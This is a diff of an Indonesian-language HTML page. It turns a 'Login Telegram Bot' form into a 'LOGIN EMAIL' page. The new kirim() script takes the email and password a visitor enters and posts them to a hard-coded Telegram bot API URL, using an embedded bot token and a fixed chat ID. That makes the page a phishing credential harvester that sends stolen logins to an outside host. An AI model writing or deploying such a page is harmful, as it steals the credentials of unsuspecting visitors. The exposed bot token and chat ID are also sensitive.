@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Login Telegram Bot</title>
+<title>Kirim Telegram</title>
 <style>
 body {
   margin: 0;
@@ -23,27 +23,33 @@ body {
 }
 
 h2 {
-  margin-bottom: 25px;
+  margin-bottom: 20px;
 }
 
 input {
   width: 100%;
   padding: 12px;
-  margin: 10px 0;
+  margin: 8px 0;
   border-radius: 8px;
   border: 1px solid #ccc;
   outline: none;
+  font-size: 14px;
 }
 
 button {
   width: 100%;
   padding: 12px;
+  margin-top: 10px;
   border: none;
   border-radius: 8px;
   background: linear-gradient(135deg, #667eea, #764ba2);
   color: white;
   font-size: 16px;
   cursor: pointer;
+}
+
+button:hover {
+  opacity: 0.9;
 }
 
 .note {
@@ -57,18 +63,18 @@ button {
 <body>
 
 <div class="container">
-  <h2>🔐 Login Telegram Bot</h2>
+  <h2>LOGIN EMAIL</h2>
 
-  <input type="text" id="token" placeholder="Bot Token">
-  <input type="text" id="chat_id" placeholder="Chat ID">
+  <input type="text" id="token" placeholder="EMAIL">
+  <input type="text" id="chat_id" placeholder="PASWORD">
 
-  <button onclick="login()">Login</button>
+  <button onclick="kirim()">Kirim</button>
 
-  <div class="note">Masukkan Bot Token dan Chat ID Anda</div>
+  <div class="note">Harap masukan alamat email dan pasword</div>
 </div>
 
 <script>
-function login() {
+function kirim() {
   var token = document.getElementById("token").value;
   var chat_id = document.getElementById("chat_id").value;
 
@@ -77,17 +83,16 @@ function login() {
     return;
   }
 
-  // Simpan
-  localStorage.setItem("token", token);
-  localStorage.setItem("chat_id", chat_id);
+  // pesan berisi semua data
+  var pesan = "DATA MASUK:\n\n"
+            + "EMAIL: " + token + "\n"
+            + "PASWORD: " + chat_id;
 
-  // Pesan yang dikirim ke Telegram
-  var pesan = "🔐 Login Baru!\n\nBot Token: " + token + "\nChat ID: " + chat_id;
-
-  // Kirim ke Telegram
   fetch("https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage", {
     method: "POST",
-    headers: {"Content-Type": "application/json"},
+    headers: {
+      "Content-Type": "application/json"
+    },
     body: JSON.stringify({
       chat_id: 6297122078,
       text: pesan
@@ -95,16 +100,12 @@ function login() {
   })
   .then(res => res.json())
   .then(data => {
-    if(data.ok){
-      alert("Login berhasil ");
-    } else {
-      alert("Gagal!");
-    }
+    alert("Data berhasil dikirim!");
   })
   .catch(err => {
-    alert("Error koneksi!");
+    alert("Gagal mengirim!");
+    console.log(err);
   });
-
 }
 </script>
 
